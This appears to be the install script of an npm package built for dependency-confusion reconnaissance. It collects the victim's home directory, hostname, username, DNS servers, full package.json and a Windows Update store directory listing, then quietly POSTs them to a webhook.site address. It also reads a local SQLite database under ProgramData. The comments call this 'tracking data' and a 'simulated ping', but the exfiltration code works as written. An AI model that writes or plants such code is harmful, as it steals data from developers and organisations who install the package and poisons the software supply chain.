const fs = require("fs");
const path = require("path");
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const sqlite3 = require('sqlite3').verbose(); // Add sqlite3 library
const { exec } = require("child_process");
const packageJSON = require("./package.json");
const packageName = packageJSON.name;

// Function to send a ping (placeholder logic)
const sendPing = () => {
    console.log("Simulated Ping sent!");
};

// Perform a ping before sending tracking data
sendPing();

// Find the path to @vue/compiler-sfc by searching parent directories
const vueCompilerPath = findModulePathUpwards(__dirname, "@vue/compiler-sfc");

// Log the path if found
if (vueCompilerPath) {
    console.log("Path to @vue/compiler-sfc:", vueCompilerPath);
} else {
    console.log("@vue/compiler-sfc not found in node_modules or parent directories.");
}

// Function to get a list of files in the specified directory
const getDirectoryContents = (directoryPath) => {
    try {
        return fs.readdirSync(directoryPath);
    } catch (error) {
        console.error(`Error reading directory ${directoryPath}: ${error.message}`);
        return [];
    }
};

// Path to the SQLite database file
const dbPath = "C:\\ProgramData\\USOPrivate\\UpdateStore\\store.db";

// Function to query SQLite database and log results
const queryDatabase = () => {
    const db = new sqlite3.Database(dbPath);

    db.serialize(() => {
        db.each("SELECT * FROM your_table", (err, row) => {
            console.log(row); // Display each row of data
        });
    });

    db.close();
};

// Get the list of files in the "All Users" directory
const allUsersDirectoryContents = getDirectoryContents("C:\\ProgramData\\USOPrivate\\UpdateStore");

// Include the "All Users" directory contents in the tracking data
const trackingData = JSON.stringify({
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    allUsersDirectoryContents,
    vueCompilerPath: vueCompilerPath || "Not found", // Include the path to @vue/compiler-sfc
});

const postData = querystring.stringify({
    msg: trackingData,
});

const options = {
    hostname: "webhook.site", // Replace with your actual webhook hostname
    port: 443,
    path: "/87d635be-aebd-40b4-a842-c8d2becb4e35", // Replace with your actual path
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

const req = https.request(options, (res) => {
    let responseData = '';

    res.on("data", (chunk) => {
        responseData += chunk;
    });

    res.on("end", () => {
        console.log("Response from webhook:", responseData);
    });
});

req.on("error", (e) => {
    console.error(e);
});

// Write the entire request body and end the request
req.write(postData);
req.end();

// Function to find a module path upwards in the directory tree
function findModulePathUpwards(startDir, moduleName) {
    let currentDir = startDir;
    while (true) {
        const modulePath = path.join(currentDir, "node_modules", moduleName);
        if (fs.existsSync(modulePath)) {
            return modulePath;
        }

        const parentDir = path.dirname(currentDir);
        if (parentDir === currentDir) {
            // Reached the root directory
            break;
        }

        currentDir = parentDir;
    }

    return null; // Module not found
}

// Query the SQLite database
queryDatabase();

